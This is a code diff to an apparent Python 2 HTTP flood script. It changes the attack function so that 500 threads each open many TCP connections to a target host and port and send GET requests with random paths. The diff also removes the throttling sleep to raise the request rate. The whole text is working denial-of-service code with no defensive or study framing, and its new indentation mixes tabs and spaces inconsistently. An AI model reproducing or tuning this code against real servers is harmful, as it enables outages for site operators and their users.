@@ -60,24 +60,26 @@ def generate_url_path():
 
 
 # Perform the request
-def attack():
+def attack(num_packets):
     print_status()
     url_path = generate_url_path()
+    
+    i = 0
+    while i <= num_packets:
+        i += 1
+        # Create a raw socket
+    	dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    	try:
+        	# Open the connection on that raw socket
+        	dos.connect((ip, port))
 
-    # Create a raw socket
-    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        # Open the connection on that raw socket
-        dos.connect((ip, port))
-
-        # Send the request according to HTTP spec
-        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-    except socket.error, e:
-        print "\n [ No connection, server may be down ]: " + str(e)
-    finally:
-        # Close our socket gracefully
-        dos.shutdown(socket.SHUT_RDWR)
+        	# Send the request according to HTTP spec
+        	dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
+    	except socket.error, e:
+        	print "\n [ No connection, server may be down ]: " + str(e)
+    	finally:
+        	# Close our socket gracefully
+        	dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 
 
@@ -85,13 +87,14 @@ print "[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + 
 
 # Spawn a thread per request
 all_threads = []
-for i in xrange(num_requests):
-    t1 = threading.Thread(target=attack)
+pps = int(num_requests)/500
+for i in xrange(500):
+    t1 = threading.Thread(target=attack, args=(pps,))
     t1.start()
     all_threads.append(t1)
 
     # Adjusting this sleep time will affect requests per second
-    time.sleep(0.01)
+    #time.sleep(0.000000000001)
 
 for current_thread in all_threads:
     current_thread.join()  # Make the main thread wait for the children threads
